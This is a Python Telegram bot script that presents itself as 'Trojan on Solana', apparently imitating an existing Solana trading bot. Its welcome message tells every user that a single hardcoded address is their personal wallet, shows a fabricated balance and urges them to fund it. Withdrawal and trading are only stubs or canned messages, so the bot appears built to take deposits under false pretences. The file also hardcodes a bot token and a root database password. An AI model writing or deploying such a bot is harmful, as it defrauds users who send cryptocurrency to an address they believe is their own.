import mysql.connector
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

# Define the admin Telegram user ID
ADMIN_ID = 5698476270  # Replace with your Telegram user ID

# Function to connect to MySQL database
def connect_to_db():
    return mysql.connector.connect(
        host="localhost",
        user="root",
        password="123456789",
        database="bot_data"  # The name of your database
    )

# Function to store messages in the database
def store_message(user_id, message):
    db = connect_to_db()
    cursor = db.cursor()

    # SQL query to insert data into the table
    query = "INSERT INTO messages (user_id, message, timestamp) VALUES (%s, %s, NOW())"
    cursor.execute(query, (user_id, message))

    # Commit the changes to the database
    db.commit()

    # Close the cursor and database connection
    cursor.close()
    db.close()

# Function to fetch user statistics from the database
async def get_user_statistics():
    db = connect_to_db()
    cursor = db.cursor()

    # Get the total number of users
    cursor.execute("SELECT COUNT(DISTINCT user_id) FROM messages")
    total_users = cursor.fetchone()[0]

    # Get the total number of messages
    cursor.execute("SELECT COUNT(*) FROM messages")
    total_messages = cursor.fetchone()[0]

    # Get the number of messages in the last 24 hours
    cursor.execute("SELECT COUNT(*) FROM messages WHERE timestamp > NOW() - INTERVAL 1 DAY")
    messages_last_24_hours = cursor.fetchone()[0]

    # Close the connection
    cursor.close()
    db.close()

    # Format the statistics message
    stats_message = (
        f"👨‍💻 User Statistics:\n\n"
        f"Total Users: {total_users}\n"
        f"Total Messages: {total_messages}\n"
        f"Messages in the Last 24 Hours: {messages_last_24_hours}\n"
    )

    return stats_message

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [
            InlineKeyboardButton("Admin Page", callback_data="admin_page"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = (
        "Welcome to Trojan on Solana!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana\n\n"
        "CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n"
        "(tap to copy)\n\n"
        "Balance: (2.419) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly "
        "faster due to lighter user load.\n\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot\n"
    )

    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()  # Acknowledge the button press

    # Handle different button presses
    if query.data == "buy":
        # The details of the buy process
        buy_message = (
            "Buy $SLND- (Solend) 📈\n\n"
            "Share token with your Reflink\n\n"
            "Balance: -_- SOL - W1 ✏️\n\n"
            "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
            "30m: -1.64% - 24h: -5.66%\n\n"
            "Renounced❌\n\n"
            "🔴 Insufficient balance for buy amount + gas."
        )
        await query.edit_message_text(buy_message, reply_markup=main_menu_keyboard())
    elif query.data == "sell":
        await query.edit_message_text("You selected 'Sell'.", reply_markup=main_menu_keyboard())
    elif query.data == "positions":
        await query.edit_message_text("Positions functionality coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "limit_orders":
        await query.edit_message_text("Limit Orders functionality coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "referrals":
        await query.edit_message_text("Referrals functionality coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "withdraw":
        await query.edit_message_text("Withdraw functionality coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "copy_trade":
        await query.edit_message_text("Copy Trade functionality coming soon!", reply_markup=main_menu_keyboard())
    elif query.data == "admin_page":
        if user_id == ADMIN_ID:
            admin_message = (
                "👨‍💻 Admin Page\n\n"
                "Welcome, Admin! Here you can manage the bot:\n"
                "- View user statistics\n"
                "- Update bot settings\n"
                "- Add or remove features\n\n"
                "Choose an action:"
            )
            admin_menu_keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("View User Statistics", callback_data="view_user_stats"),
                    InlineKeyboardButton("Update Settings", callback_data="update_settings"),
                ],
                [
                    InlineKeyboardButton("Add Features", callback_data="add_features"),
                    InlineKeyboardButton("Remove Features", callback_data="remove_features"),
                ],
            ])
            await query.edit_message_text(admin_message, reply_markup=admin_menu_keyboard)
        else:
            await query.edit_message_text("❌ You do not have access to the Admin Page.", reply_markup=main_menu_keyboard())
    elif query.data == "view_user_stats":
        if user_id == ADMIN_ID:
            # Fetch user statistics from the database
            stats_message = await get_user_statistics()
            await query.edit_message_text(stats_message, reply_markup=main_menu_keyboard())
        else:
            await query.edit_message_text("❌ You do not have access to the Admin Page.", reply_markup=main_menu_keyboard())
    elif query.data == "help":
        await query.edit_message_text("This is the help section. Contact support for more information.", reply_markup=main_menu_keyboard())
    else:
        await query.edit_message_text("Unknown option.", reply_markup=main_menu_keyboard())

# Main function to run the bot
def main():
    TOKEN = "7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU"  # Replace with your actual bot token
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

# Entry point of the script
if __name__ == "__main__":
    main()
